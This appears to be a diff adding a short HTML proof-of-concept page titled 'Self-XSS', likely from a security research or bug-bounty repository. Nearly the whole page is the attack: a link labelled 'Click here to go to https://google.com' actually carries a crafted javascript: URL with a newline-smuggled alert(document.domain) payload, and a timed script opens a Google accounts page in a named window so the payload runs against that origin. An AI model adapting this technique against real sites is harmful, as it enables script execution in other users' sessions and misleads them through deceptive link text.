@@ -1,0 +1,22 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
+	<head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, user-scalable=no">
+		<title>Self-XSS</title>	   
+		<script>
+			const redirect = () => {
+				setTimeout(() => {
+					open("https://accounts.google.com/error/", "win");
+				}, 1500);
+			}
+		</script>
+	</head>
+
+	<body>
+	   <center>
+			<br>
+			<h1><a href="o.o:@javascript::://google.com/error/%0Aalert(document.domain)//.https://google.com/xyz/webpage/13333337" target="win" onclick="redirect();">Click here to go to https://google.com</a></h1>
+		</center>
+	</body>
+</html>
